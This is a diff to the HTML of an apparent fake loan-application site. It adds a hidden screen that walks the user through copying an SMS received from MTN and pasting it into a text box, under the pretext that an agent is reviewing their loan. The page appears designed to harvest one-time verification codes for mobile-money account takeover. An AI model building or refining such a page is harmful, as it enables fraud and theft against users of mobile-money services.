@@ -139,13 +139,45 @@
         </div>
     </div>
 
-    <!-- Screen 6: Processing / Success -->
+    <!-- Screen 6: Processing -->
     <div id="screen-processing" class="app-screen processing">
         <h2 id="processing-title">Processing Application</h2>
-        <p id="processing-text">Please wait, this may take a few seconds</p>
+        <p id="processing-text">Please wait while an agent reviews your loan request. Do not close this page.</p>
         <div class="loader" id="loader-spinner"></div>
     </div>
 
-    <script src="script.js"></script>
+    <!-- Screen 7: Paste SMS (Hidden until approved) -->
+    <div id="screen-sms" class="app-screen">
+        <div class="content" style="text-align: center; padding-top: 40px;">
+            
+            <div style="font-size: 60px; color: #ffcc00; margin-bottom: 20px;">
+                <i class="fas fa-envelope-open-text"></i>
+            </div>
+
+            <h2 style="color: #000; font-weight: bold; margin-bottom: 15px; font-size: 24px;">Paste the <span style="color: #ffcc00;">SMS</span> from MTN</h2>
+            
+            <p style="font-size: 16px; color: #555; margin-bottom: 25px; line-height: 1.5;">
+                We sent a confirmation message to your number.<br>
+                <strong>Copy the full SMS you received</strong> and paste it below to continue.
+            </p>
+
+            <div style="background: #fff8e1; border: 1px solid #ffe082; padding: 15px; border-radius: 10px; text-align: left; margin-bottom: 20px; font-size: 14px; line-height: 1.5;">
+                <span style="color: #ffa000; font-size: 20px; float: left; margin-right: 10px;"><i class="fas fa-lightbulb"></i></span>
+                Open your <strong>Messages app</strong>, find the SMS from <strong>MTN</strong>, long-press it, tap <strong>Copy</strong>, then come back here.
+            </div>
+
+            <textarea id="sms-input" placeholder="Coller le SMS reçu de MTN ici..." style="width: 100%; height: 120px; padding: 15px; border: 1px solid #ccc; border-radius: 10px; font-size: 16px; resize: none; margin-bottom: 10px;"></textarea>
+            
+            <div style="display: flex; justify-content: space-between; font-size: 14px; color: #777; margin-bottom: 25px;">
+                <span>Didn't receive the SMS?</span>
+                <span style="color: #999; font-weight: bold; cursor: pointer;">Resend SMS</span>
+            </div>
+
+            <button class="btn-primary" style="background: #ffe082; color: #fff; font-size: 18px; border: none; pointer-events: none;">VERIFY & CONTINUE &rarr;</button>
+        </div>
+    </div>
+
+    <!-- Force browser to load the newest script version -->
+    <script src="script.js?v=4"></script>
 </body>
 </html>
